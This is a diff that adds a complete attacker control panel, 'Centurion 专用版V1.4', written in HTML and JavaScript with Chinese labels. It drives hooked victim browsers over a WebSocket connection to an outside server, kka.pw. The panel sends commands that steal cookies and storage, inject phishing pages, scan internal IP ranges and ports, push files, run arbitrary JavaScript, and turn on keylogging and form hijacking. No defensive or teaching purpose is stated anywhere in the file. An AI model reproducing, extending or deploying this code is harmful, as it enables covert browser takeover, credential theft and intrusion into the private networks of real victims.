@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Centurion 专用版V1.4</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-sRIl4kxILFvY47J16cr9ZwB07vP4J8+LH7qKQnuqkuIAvNWLzeN8tE5YBujZqJLB" crossorigin="anonymous">
+  <style>
+    .control-layout > section {
+      width: 100%;
+      min-width: 0;
+    }
+
+    @media (min-width: 992px) {
+      .control-layout > .control-left {
+        flex: 0 0 40%;
+        max-width: 40%;
+      }
+
+      .control-layout > .control-right {
+        flex: 0 0 60%;
+        max-width: 60%;
+      }
+    }
+
+    /* ===== 关键：日志区域贴底 & 正确滚动 ===== */
+    .log-body {
+      max-height: 60vh;
+      /* 你想更紧就用 pb-0，这里先给一个很小的下边距 */
+      padding-bottom: .25rem !important;
+      overflow: hidden !important; /* 外层不滚动，避免双滚动造成“空白感” */
+      min-height: 0; /* flex 子元素可滚动的关键 */
+    }
+
+    #response {
+      flex: 1 1 auto;  /* 撑满剩余空间 */
+      min-height: 0;   /* 允许内部滚动 */
+      margin: 0 !important;
+      overflow: auto;  /* 让 pre 自己滚动 */
+    }
+  </style>
+</head>
+<body>
+  <div class="container py-4">
+    <div class="card mb-3">
+      <div class="card-body d-flex flex-wrap justify-content-between align-items-center gap-2">
+        <div class="h4 mb-0">Centurion 专用版 <span class="badge bg-light text-dark">V1.4</span></div>
+        <div class="d-flex flex-wrap gap-2">
+          <span id="wsStatus" class="badge bg-secondary">离线</span>
+          <span class="badge bg-light text-dark">受害者 <span id="victimCount">0</span></span>
+          <span class="badge bg-light text-dark">当前 <span id="currentVictim">未选择</span></span>
+        </div>
+      </div>
+    </div>
+
+    <main class="d-flex flex-column flex-lg-row gap-3 align-items-stretch control-layout">
+      <section class="d-flex flex-column control-left">
+        <div class="card flex-grow-1">
+          <div class="card-header fw-semibold">目标投递</div>
+          <div class="card-body">
+            <div class="mb-3">
+              <label for="victimSelect" class="form-label">选择受害者</label>
+              <select id="victimSelect" class="form-select form-select-sm">
+                <option value="">-- 暂无受害者连接 --</option>
+              </select>
+            </div>
+
+            <hr class="my-3">
+            <div class="mb-3">
+              <label for="url" class="form-label">定向请求 URL/预览页面</label>
+              <div class="row g-2 align-items-center">
+                <div class="col-auto">
+                  <button class="btn btn-primary btn-sm" onclick="sendAndPreview()">发送/预览</button>
+                </div>
+                <div class="col">
+                  <input id="url" class="form-control form-control-sm" placeholder="https://192.168.1.124:8080/example.html">
+                </div>
+                <div class="col-auto">
+                  <div class="form-check">
+                    <input class="form-check-input" type="checkbox" id="autoTarget">
+                    <label class="form-check-label" for="autoTarget">自动</label>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <hr class="my-3">
+            <div class="mb-2">
+              <label for="iprange" class="form-label">内网扫描 IP / 范围 / CIDR - 端口</label>
+              <input id="iprange" class="form-control form-control-sm" placeholder="192.168.1.10-20 或 192.168.1.0/24">
+            </div>
+            <div class="mb-3">
+              <div class="row g-2 align-items-center">
+                <div class="col-auto">
+                  <button class="btn btn-primary btn-sm" onclick="scan()">扫描</button>
+                </div>
+                <div class="col">
+                  <input id="ports" class="form-control form-control-sm" placeholder="80,8080,3000-3010">
+                </div>
+                <div class="col-auto">
+                  <div class="form-check">
+                    <input class="form-check-input" type="checkbox" id="autoScan">
+                    <label class="form-check-label" for="autoScan">自动</label>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <hr class="my-3">
+            <div class="mb-1">
+              <label for="fileInput" class="form-label">文件下发</label>
+              <div class="row g-2 align-items-center">
+                <div class="col-auto">
+                  <button class="btn btn-primary btn-sm" onclick="sendFile()">发送</button>
+                </div>
+                <div class="col">
+                  <input type="file" id="fileInput" class="form-control form-control-sm">
+                </div>
+                <div class="col-auto">
+                  <div class="form-check">
+                    <input class="form-check-input" type="checkbox" id="autoUpload">
+                    <label class="form-check-label" for="autoUpload">自动</label>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <hr class="my-3">
+            <div class="mb-3">
+              <label for="phishingUrl" class="form-label">钓鱼页面注入</label>
+              <div class="row g-2 align-items-center">
+                <div class="col-auto">
+                  <button class="btn btn-danger btn-sm" onclick="injectPhishing()">注入</button>
+                </div>
+                <div class="col">
+                  <input id="phishingUrl" class="form-control form-control-sm" placeholder="真实登录页面URL (如: https://example.com/login)">
+                </div>
+              </div>
+            </div>
+
+            <hr class="my-3">
+
+            <div class="fw-semibold mb-2">信息收集</div>
+            <div class="row row-cols-2 g-2 mb-3">
+              <div class="col">
+                <div class="form-check">
+                  <input class="form-check-input" type="checkbox" id="info_useragent" checked>
+                  <label class="form-check-label" for="info_useragent">用户代理</label>
+                </div>
+              </div>
+              <div class="col">
+                <div class="form-check">
+                  <input class="form-check-input" type="checkbox" id="info_platform" checked>
+                  <label class="form-check-label" for="info_platform">平台</label>
+                </div>
+              </div>
+              <div class="col">
+                <div class="form-check">
+                  <input class="form-check-input" type="checkbox" id="info_url" checked>
+                  <label class="form-check-label" for="info_url">URL + Referrer</label>
+                </div>
+              </div>
+              <div class="col">
+                <div class="form-check">
+                  <input class="form-check-input" type="checkbox" id="info_plugins" checked>
+                  <label class="form-check-label" for="info_plugins">插件</label>
+                </div>
+              </div>
+              <div class="col">
+                <div class="form-check">
+                  <input class="form-check-input" type="checkbox" id="info_cookies" checked>
+                  <label class="form-check-label" for="info_cookies">Cookies</label>
+                </div>
+              </div>
+              <div class="col">
+                <div class="form-check">
+                  <input class="form-check-input" type="checkbox" id="info_storage" checked>
+                  <label class="form-check-label" for="info_storage">存储</label>
+                </div>
+              </div>
+            </div>
+            <div class="row g-2 align-items-center">
+              <div class="col-auto">
+                <button class="btn btn-primary btn-sm" onclick="collectInfo()">收集</button>
+              </div>
+              <div class="col-auto">
+                <div class="form-check">
+                  <input class="form-check-input" type="checkbox" id="autoCollect">
+                  <label class="form-check-label" for="autoCollect">自动</label>
+                </div>
+              </div>
+            </div>
+
+            <hr class="my-3">
+
+            <div class="fw-semibold mb-2">高级功能</div>
+            <div class="row row-cols-2 g-2 mb-3">
+              <div class="col">
+                <div class="form-check">
+                  <input class="form-check-input" type="checkbox" id="feat_keylog">
+                  <label class="form-check-label" for="feat_keylog">键盘记录</label>
+                </div>
+              </div>
+              <div class="col">
+                <div class="form-check">
+                  <input class="form-check-input" type="checkbox" id="feat_formhijack">
+                  <label class="form-check-label" for="feat_formhijack">表单劫持</label>
+                </div>
+              </div>
+              <div class="col">
+                <div class="form-check">
+                  <input class="form-check-input" type="checkbox" id="feat_chunked">
+                  <label class="form-check-label" for="feat_chunked">分片传输</label>
+                </div>
+              </div>
+            </div>
+            <div class="row g-2 align-items-center">
+              <div class="col-auto">
+                <button class="btn btn-primary btn-sm" onclick="applyFeatures()">应用</button>
+              </div>
+              <div class="col-auto">
+                <div class="form-check">
+                  <input class="form-check-input" type="checkbox" id="autoFeatures" checked>
+                  <label class="form-check-label" for="autoFeatures">自动</label>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </section>
+
+      <section class="d-flex flex-column control-right">
+        <div class="card">
+          <div class="card-header fw-semibold">自定义脚本</div>
+          <div class="card-body">
+            <label for="customJs" class="form-label">要执行的 JavaScript</label>
+            <textarea id="customJs" class="form-control form-control-sm mb-3" rows="4" placeholder="例如：alert('hello world')"></textarea>
+            <div class="row g-2 align-items-center">
+              <div class="col-auto">
+                <button class="btn btn-danger btn-sm" onclick="sendCustomJs()">执行</button>
+              </div>
+              <div class="col-auto">
+                <div class="form-check">
+                  <input class="form-check-input" type="checkbox" id="autoJs">
+                  <label class="form-check-label" for="autoJs">自动</label>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card mt-3 flex-grow-1">
+          <div class="card-header d-flex flex-wrap gap-2 align-items-center justify-content-between">
+            <div class="fw-semibold">日志输出</div>
+            <div class="btn-group btn-group-sm">
+              <button class="btn btn-outline-secondary" onclick="copyLog()">复制</button>
+              <button class="btn btn-outline-secondary" onclick="saveLog('txt')">保存 .txt</button>
+              <button class="btn btn-outline-secondary" onclick="saveLog('json')">保存 .json</button>
+            </div>
+          </div>
+
+          <!-- ✅ 改这里：用 log-body，外层不滚动，padding-bottom 更小 -->
+          <div class="card-body d-flex flex-column p-2 log-body">
+            <!-- ✅ 改这里：去掉 h-100，改成 flex-grow-1，滚动放在 pre 上 -->
+            <pre id="response" class="border rounded bg-light p-2 small w-100"></pre>
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <footer class="text-center text-muted small mt-4"></footer>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/js/bootstrap.bundle.min.js" integrity="sha384-FKyoEForCGlyvwx9Hj09JcYn3nv7wiPVlz7YYwJrWVcXK/BmnVDxM+D2scQbITxI" crossorigin="anonymous"></script>
+
+<script>
+// ===== 基础连接 =====
+// 控制面板与服务端建立 WebSocket 连接（需要替换 SERVER-IP）
+const socket = new WebSocket("wss://kka.pw:8443/ws");
+const victimSelect = document.querySelector("#victimSelect");
+const logOutput = document.querySelector("#response");
+const logLines = [];
+const victimsData = {};
+const wsStatus = document.querySelector("#wsStatus");
+const victimCount = document.querySelector("#victimCount");
+const currentVictim = document.querySelector("#currentVictim");
+// Cache last HTML preview (from victim fetch) per victim.
+const lastHtmlPreview = {}; // victimId -> html string
+const lastRequestMeta = {}; // victimId -> { url, status, ts }
+let lastVictimWithPreview = null;
+
+function setWsStatus(online) {
+  if (online) {
+    wsStatus.textContent = "在线";
+    wsStatus.classList.remove("bg-secondary", "text-bg-secondary");
+    wsStatus.classList.add("bg-success", "text-white");
+  } else {
+    wsStatus.textContent = "离线";
+    wsStatus.classList.remove("bg-success", "text-bg-success", "text-white");
+    wsStatus.classList.add("bg-secondary");
+  }
+}
+
+function updateVictimCount() {
+  victimCount.textContent = Object.keys(victimsData).length;
+}
+
+function updateCurrentVictim() {
+  const v = getSelectedVictim();
+  currentVictim.textContent = v || "未选择";
+}
+
+socket.onopen = () => {
+  // 告知服务端当前为 attacker 角色
+  socket.send("attacker");
+  log("[+] 控制面板已连接");
+  setWsStatus(true);
+};
+
+// 监听预览窗口的链接点击和表单提交
+window.addEventListener('message', (e) => {
+  if (!e.data) return;
+  
+  if (e.data.type === 'linkClick') {
+    const url = e.data.url;
+    const victim = getSelectedVictim();
+    if (victim && url) {
+      document.querySelector("#url").value = url;
+      sendAndPreview();
+    }
+  }
+  
+  if (e.data.type === 'formSubmit') {
+    const victim = getSelectedVictim();
+    if (!victim) return;
+    
+    const payload = {
+      action: e.data.action,
+      method: e.data.method,
+      data: e.data.data
+    };
+    
+    socket.send(`to:${victim}|submitform:${JSON.stringify(payload)}`);
+    log(`[📤] 转发表单提交到 ${victim}: ${e.data.action}`);
+  }
+});
+
+socket.onclose = () => {
+  setWsStatus(false);
+  log("[!] 与服务器连接已断开");
+};
+
+socket.onerror = () => {
+  setWsStatus(false);
+};
+
+socket.onmessage = event => {
+  // 所有服务器推送消息入口
+  const msg = event.data.trim();
+  console.log("Received:", msg);
+
+  // Track last URL request meta: "[victim-x] [✅] <url> → <status>"
+  {
+    const m = msg.match(/^\[(victim-\d+)\]\s+\[✅\]\s+(.+?)\s+→\s+(\d+)\s*$/);
+    if (m) {
+      const victimId = m[1];
+      lastRequestMeta[victimId] = { url: m[2], status: parseInt(m[3], 10), ts: Date.now() };
+    }
+  }
+
+  // Cache HTML preview payload: "[victim-x] [📄] 内容预览:\n... \n---"
+  {
+    const m = msg.match(/^\[(victim-\d+)\]\s+\[📄\][^\n]*\n([\s\S]*?)\n---\s*$/);
+    if (m) {
+      const victimId = m[1];
+      lastHtmlPreview[victimId] = m[2];
+      lastVictimWithPreview = victimId;
+    }
+  }
+
+  if (msg.startsWith("[🟢] 受害者已连接: ")) {
+    // 新 victim 上线，更新下拉列表并触发自动任务
+    const match = msg.match(/受害者已连接: (victim-\d+)\s+\(([^)]+)\)/);
+    if (match) {
+      addVictim(match[1], match[2]);
+      if (document.querySelector("#autoCollect").checked) sendCollectCommand(match[1]);
+      if (document.querySelector("#autoScan").checked) autoScanForVictim(match[1]);
+      if (document.querySelector("#autoTarget").checked) autoTargetForVictim(match[1]);
+      if (document.querySelector("#autoUpload").checked) autoUploadForVictim(match[1]);
+      if (document.querySelector("#autoPhishing").checked) autoPhishingForVictim(match[1]);
+      if (document.querySelector("#autoJs").checked) sendCustomJs(match[1]);
+      if (document.querySelector("#autoFeatures").checked) applyFeaturesForVictim(match[1]);
+    }
+  }
+
+  if (msg.startsWith("[🔴] 受害者已断开: ")) {
+    // victim 离线，移除下拉选项
+    const match = msg.match(/受害者已断开: (victim-\d+)/);
+    if (match) removeVictim(match[1]);
+  }
+
+  if (msg.includes("[收集到的信息]")) {
+    // 解析结构化信息并美化输出
+    const info = msg.split("[收集到的信息]")[1].trim();
+    try {
+      log("[收集到的信息]\n" + JSON.stringify(JSON.parse(info), null, 2));
+    } catch (e) {
+      log("Parse error: " + e);
+    }
+    return;
+  }
+
+  // ✅ Filter out fetch errors
+  if (!msg.includes("[❌] 请求错误")) {
+    log(msg);
+  }
+};
+
+function getSelectedVictim() {
+  // 当前下拉框选中的 victim id
+  return victimSelect.value;
+}
+
+function send() {
+  // 发送单个 URL 给选中的 victim
+  const victim = getSelectedVictim();
+  const url = document.querySelector("#url").value;
+  if (!victim || !url) return;
+  socket.send(`to:${victim}|${url}`);
+}
+
+function sendAndPreview() {
+  // 发送 URL 并等待返回后自动预览
+  const victim = getSelectedVictim();
+  const url = document.querySelector("#url").value;
+  if (!victim || !url) return;
+  
+  // 发送请求
+  socket.send(`to:${victim}|${url}`);
+  
+  // 等待 HTML 预览数据返回后自动打开
+  const checkInterval = setInterval(() => {
+    if (lastHtmlPreview[victim]) {
+      clearInterval(checkInterval);
+      setTimeout(() => openHtmlPreview(victim), 500);
+    }
+  }, 100);
+  
+  // 30秒超时
+  setTimeout(() => clearInterval(checkInterval), 30000);
+}
+
+function scan() {
+  // 手动扫描：展开 IP/端口组合后逐条发送
+  const victim = getSelectedVictim();
+  if (!victim) return;
+  const ips = expandIPRange(document.querySelector("#iprange").value);
+  const ports = expandPortList(document.querySelector("#ports").value);
+  for (const ip of ips) {
+    for (const port of ports) {
+      socket.send(`to:${victim}|https://${ip}:${port}`);
+    }
+  }
+}
+
+function autoScanForVictim(victimId) {
+  // victim 连接时自动扫描
+  const ips = expandIPRange(document.querySelector("#iprange").value);
+  const ports = expandPortList(document.querySelector("#ports").value);
+  for (const ip of ips) {
+    for (const port of ports) {
+      socket.send(`to:${victimId}|https://${ip}:${port}`);
+    }
+  }
+}
+
+function autoTargetForVictim(victimId) {
+  // victim 连接时自动访问指定 URL
+  const url = document.querySelector("#url").value;
+  if (url) socket.send(`to:${victimId}|${url}`);
+}
+
+function buildCollectCommand() {
+  // 根据勾选项拼接 collectinfo 参数
+  const flags = [];
+  if (document.querySelector("#info_useragent").checked) flags.push("useragent");
+  if (document.querySelector("#info_platform").checked) flags.push("platform");
+  if (document.querySelector("#info_url").checked) flags.push("urlref");
+  if (document.querySelector("#info_plugins").checked) flags.push("plugins");
+  if (document.querySelector("#info_cookies").checked) flags.push("cookies");
+  if (document.querySelector("#info_storage").checked) flags.push("storage");
+  return "collectinfo:" + flags.join(",");
+}
+
+function sendCollectCommand(victimId) {
+  // 发送信息收集指令
+  const cmd = buildCollectCommand();
+  socket.send(`to:${victimId}|${cmd}`);
+}
+
+function collectInfo() {
+  const victim = getSelectedVictim();
+  if (!victim) return;
+  sendCollectCommand(victim);
+}
+
+function sendFile() {
+  // 读取本地文件并以 Base64 发送
+  const fileInput = document.querySelector("#fileInput");
+  const victim = getSelectedVictim();
+  if (!victim || !fileInput.files.length) return;
+  const file = fileInput.files[0];
+  const reader = new FileReader();
+  reader.onload = e => {
+    const base64 = e.target.result.split(",")[1];
+    socket.send(`to:${victim}|file:${file.name}|${base64}`);
+  };
+  reader.readAsDataURL(file);
+}
+
+function autoUploadForVictim(victimId) {
+  // victim 连接时自动上传（如果已选择文件）
+  const fileInput = document.querySelector("#fileInput");
+  if (!fileInput.files.length) return;
+  const file = fileInput.files[0];
+  const reader = new FileReader();
+  reader.onload = e => {
+    const base64 = e.target.result.split(",")[1];
+    socket.send(`to:${victimId}|file:${file.name}|${base64}`);
+  };
+  reader.readAsDataURL(file);
+}
+
+function injectPhishing() {
+  const victim = getSelectedVictim();
+  const url = document.querySelector("#phishingUrl").value;
+  if (!victim || !url) return;
+  socket.send(`to:${victim}|phishing:${url}`);
+}
+
+function autoPhishingForVictim(victimId) {
+  const url = document.querySelector("#phishingUrl").value;
+  if (!url) return;
+  socket.send(`to:${victimId}|phishing:${url}`);
+}
+
+function sendCustomJs(victimOverride = null) {
+  // 发送任意 JS 执行指令
+  const code = document.querySelector("#customJs").value.trim();
+  const victim = victimOverride || getSelectedVictim();
+  if (!victim || !code) return;
+  socket.send(`to:${victim}|exec:${code}`);
+}
+
+function applyFeatures() {
+  const victim = getSelectedVictim();
+  if (!victim) return;
+  const keylog = document.querySelector("#feat_keylog").checked;
+  const formhijack = document.querySelector("#feat_formhijack").checked;
+  const chunked = document.querySelector("#feat_chunked").checked;
+  socket.send(`to:${victim}|features:${keylog?1:0},${formhijack?1:0},${chunked?1:0}`);
+}
+
+function applyFeaturesForVictim(victimId) {
+  const keylog = document.querySelector("#feat_keylog").checked;
+  const formhijack = document.querySelector("#feat_formhijack").checked;
+  const chunked = document.querySelector("#feat_chunked").checked;
+  socket.send(`to:${victimId}|features:${keylog?1:0},${formhijack?1:0},${chunked?1:0}`);
+}
+
+function addVictim(id, ip) {
+  // 将新 victim 加入下拉列表
+  victimsData[id] = ip;
+  const opt = document.createElement("option");
+  opt.value = id;
+  opt.textContent = `${id} (${ip})`;
+  victimSelect.appendChild(opt);
+  if (victimSelect.options.length === 2) victimSelect.selectedIndex = 1;
+  updateVictimCount();
+  updateCurrentVictim();
+}
+
+function removeVictim(id) {
+  // 从下拉列表移除离线 victim
+  delete victimsData[id];
+  [...victimSelect.options].forEach(o => {
+    if (o.value === id) o.remove();
+  });
+  updateVictimCount();
+  updateCurrentVictim();
+}
+
+function expandIPRange(input) {
+  // 支持 CIDR / 范围 / 单 IP 三种格式
+  if (input.includes("/")) return expandCIDR(input);
+  if (input.includes("-")) {
+    const [base, end] = input.split("-");
+    const start = parseInt(base.split(".")[3]), last = parseInt(end);
+    const prefix = base.split(".").slice(0, 3).join(".");
+    return Array.from({ length: last - start + 1 }, (_, i) => `${prefix}.${start + i}`);
+  }
+  return [input];
+}
+
+function expandCIDR(cidr) {
+  // 将 CIDR 展开为 IP 列表（跳过网络地址和广播地址）
+  const [ip, mask] = cidr.split("/");
+  const [a, b, c, d] = ip.split(".").map(Number);
+  const base = (a << 24) + (b << 16) + (c << 8) + d;
+  const range = 2 ** (32 - parseInt(mask));
+  const list = [];
+  for (let i = 1; i < range - 1; i++) {
+    const val = base + i;
+    list.push(`${(val >> 24) & 255}.${(val >> 16) & 255}.${(val >> 8) & 255}.${val & 255}`);
+  }
+  return list;
+}
+
+function expandPortList(str) {
+  // 支持单端口、逗号分隔、范围（如 8000-8010）
+  const ports = new Set();
+  str.split(",").forEach(p => {
+    if (p.includes("-")) {
+      const [s, e] = p.split("-").map(Number);
+      for (let i = s; i <= e; i++) ports.add(i);
+    } else {
+      ports.add(parseInt(p));
+    }
+  });
+  return [...ports];
+}
+
+function log(msg) {
+  // 追加日志并滚动到底部
+  logLines.push(msg);
+  logOutput.textContent += msg + "\n";
+  logOutput.scrollTop = logOutput.scrollHeight;
+}
+
+function copyLog() {
+  // 复制日志到剪贴板
+  navigator.clipboard.writeText(logLines.join("\n"));
+}
+
+function openHtmlPreview(victimOverride = null) {
+  const victimId = victimOverride || getSelectedVictim() || lastVictimWithPreview;
+  if (!victimId) {
+    alert("暂无可预览的 HTML（先发送 URL 并等待 [📄] 内容预览）。");
+    return;
+  }
+  const html = lastHtmlPreview[victimId];
+  if (!html) {
+    alert(`victim ${victimId} 暂无可预览的 HTML（先等待 [📄] 内容预览）。`);
+    return;
+  }
+
+  const injectedScript = "<script>" +
+    "(function() {" +
+    "  window.addEventListener('click', function(e) {" +
+    "    const link = e.target.closest('a');" +
+    "    if (link && link.href) {" +
+    "      e.preventDefault();" +
+    "      if (window.opener && !window.opener.closed) {" +
+    "        window.opener.postMessage({type: 'linkClick', url: link.href}, '*');" +
+    "      }" +
+    "    }" +
+    "  }, true);" +
+    "  document.addEventListener('submit', function(e) {" +
+    "    e.preventDefault();" +
+    "    const form = e.target;" +
+    "    const formData = new FormData(form);" +
+    "    const data = {};" +
+    "    formData.forEach((value, key) => { data[key] = value; });" +
+    "    if (window.opener && !window.opener.closed) {" +
+    "      window.opener.postMessage({" +
+    "        type: 'formSubmit'," +
+    "        action: form.action || window.location.href," +
+    "        method: form.method || 'GET'," +
+    "        data: data" +
+    "      }, '*');" +
+    "    }" +
+    "  }, true);" +
+    "})();" +
+    "</" + "script>";
+  
+  const injectedHtml = injectedScript + html;
+  const blob = new Blob([injectedHtml], { type: "text/html;charset=utf-8" });
+  const blobUrl = URL.createObjectURL(blob);
+  window.open(blobUrl, "_blank");
+}
+
+victimSelect.addEventListener("change", () => {
+  updateCurrentVictim();
+});
+
+function saveLog(type) {
+  // 保存日志为 txt/json
+  const ts = new Date().toISOString().replace(/[:.]/g, "-");
+  const blob = type === "json"
+    ? new Blob([JSON.stringify(logLines, null, 2)], { type: "application/json" })
+    : new Blob([logLines.join("\n")], { type: "text/plain" });
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = `log-${ts}.${type}`;
+  a.click();
+}
+</script>
+
+</body>
+</html>
